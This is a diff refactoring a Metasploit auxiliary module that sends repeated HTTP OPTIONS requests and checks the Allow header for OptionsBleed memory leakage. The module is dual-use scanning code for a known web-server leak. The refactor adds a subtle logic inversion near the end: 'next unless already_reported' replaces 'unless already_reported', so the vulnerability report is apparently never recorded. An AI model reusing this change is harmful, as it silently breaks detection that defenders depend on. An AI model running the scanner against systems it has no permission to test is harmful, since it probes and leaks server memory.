@@ -44,15 +44,10 @@ class MetasploitModule < Msf::Auxiliary
       'method'  => 'OPTIONS',
       'uri'     => datastore['TARGETURI']
     }, 10)
-    if res
-      if res.headers['Allow']
-        return res.headers['Allow']
-      else
-        fail_with(Failure::UnexpectedReply, "#{peer} - No Allow header identified")
-      end
-    else
-      fail_with(Failure::Unreachable, "#{peer} - Failed to respond")
-    end
+
+    fail_with(Failure::Unreachable, "#{peer} - Failed to respond") unless res
+    fail_with(Failure::UnexpectedReply, "#{peer} - No Allow header identified") unless res.headers['Allow']
+    res.headers['Allow']
   end
 
   def run_host(ip)
@@ -65,33 +60,29 @@ class MetasploitModule < Msf::Auxiliary
 
     for counter in 1..datastore['REPEAT']
       allows = get_allow_header(ip)
-      unless uniques.include?(allows) # no need to re-process non-new items
-        uniques << allows
-        if allows =~ bug_61207
-          if allows.split(',').length > allows.split(',').uniq.length # check for repeat items
-            if datastore['BUGS']
-              print_status('Some methods were sent multiple times in the list. ' +
-                           'This is a bug, but harmless. It may be Apache bug #61207.')
-            end
-          else
-            vprint_status("Request #{counter}: [Standard Response] -> #{allows}")
-          end
-        elsif allows =~ bug_1717682 && datastore['BUGS']
-          print_status('The list of methods was space-separated instead of comma-separated. ' +
-                       'This is a bug, but harmless. It may be Launchpad bug #1717682.')
+      next if uniques.include?(allows) # no need to re-process non-new items
+      uniques << allows
+      if allows =~ bug_61207
+        if allows.split(',').length > allows.split(',').uniq.length # check for repeat items
+          print_status('Some methods were sent multiple times in the list. ' +
+                       'This is a bug, but harmless. It may be Apache bug #61207.') if datastore['BUGS']
         else
-          print_good("Request #{counter}: [OptionsBleed Response] -> #{allows}")
-          unless already_reported
-            report_vuln(
-              :host => ip,
-              :port => rport,
-              :name => self.name,
-              :refs => self.references
-            )
-            already_reported = true
-          end
+          vprint_status("Request #{counter}: [Standard Response] -> #{allows}")
         end
+      elsif allows =~ bug_1717682 && datastore['BUGS']
+        print_status('The list of methods was space-separated instead of comma-separated. ' +
+                     'This is a bug, but harmless. It may be Launchpad bug #1717682.')
+      else
+        print_good("Request #{counter}: [OptionsBleed Response] -> #{allows}")
       end
+      next unless already_reported
+        report_vuln(
+          :host => ip,
+          :port => rport,
+          :name => self.name,
+          :refs => self.references
+        )
+        already_reported = true
     end
   end
 end
